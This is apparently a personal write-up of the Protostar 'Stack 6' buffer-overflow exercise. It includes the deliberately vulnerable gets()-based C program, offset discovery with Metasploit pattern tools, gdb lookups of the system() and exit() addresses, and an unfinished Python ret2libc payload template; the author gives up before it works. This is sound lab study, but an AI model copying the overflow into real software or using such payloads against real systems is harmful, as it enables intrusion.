# Stack 6

## About

Stack6 looks at what happens when you have restrictions on the return address.
This level can be done in a couple of ways, such as finding the duplicate of the payload (objdump -s) will help with this), or ret2libc, or even return orientated programming.
It is strongly suggested you experiment with multiple ways of getting your code to execute here.

``` c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
    unsigned int ret;
	
	  printf("input path please: "); fflush(stdout);
	  
	    gets(buffer);
		
		  ret = __builtin_return_address(0);
		  
		    if((ret & 0xbf000000) == 0xbf000000) {
			      printf("bzzzt (%p)\n", ret);
				        _exit(1);
						  }
						  
						    printf("got path %s\n", buffer);
							}
							
							int main(int argc, char **argv)
							{
							  getpath();
							  
							  
							  
							  }
							  
```

## Solution

ok so this level i canâ€™t execute any shellcode put on the stack. this means the return address cant be on the stack, so we can still control execution flow of the program by overflowing a buffer and `eip`.
reading up on this looks like i'll have to do a `return-to-libc` attack, so rather than the return address pointin to the stack, it will point to the `libc` libary.

first i need to find the offset using the same method as before.

``` bash
[root:/opt/Data/stack6]# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100 > pattern
[root:/opt/Data/stack6]# gdb ./stack6

pwndbg> r <pattern
```

```
Program received signal SIGSEGV (fault address 0x37634136)

[root:/opt/Data/stack6]# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x37634136
[*] Exact match at offset 80
```

ok great the offset is `80` so our buffer should looks something like this 

` junk - system() - exit() - arg1 - arg2` 

lets build the following template to fill in those values 

``` python
#!/usr/bin/env python

offset = 80
shell = '/bin/sh;#'
junk = 'A' * (offset - len(shell))

systemaddr =
systemarg = 

exitaddr =
exitarg = '\xff\xff\xff\xff'

payload = shell + junk + systemaddr + exitaddr + systemarg

print(payload)
```

so the exitarg option is optional, so for now i'll see if i can not use it in the payload

lets start filling out some of these values 

``` bash
pwndbg> break main
Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.
pwndbg> print system
$1 = {<text variable, no debug info>} 0xf7e4bb30 <__libc_system>
pwndbg> print exit
$2 = {<text variable, no debug info>} 0xf7e3f7e0 <__GI_exit>
```

ok finding the systemarg address was really hard, and then i noticed this 

``` bash
[root:/opt/Data/stack6]# strings -a -t x /lib/i386-linux-gnu/ld-2.24.so | grep "/bin/sh"

```
that returned nothing, so i'd never be able to get a shell from `libc`, i'm 99% sure this is because i'm not on the protostar ISO and on a 64bit VM. So because i understand this concept i'll move on to the next level
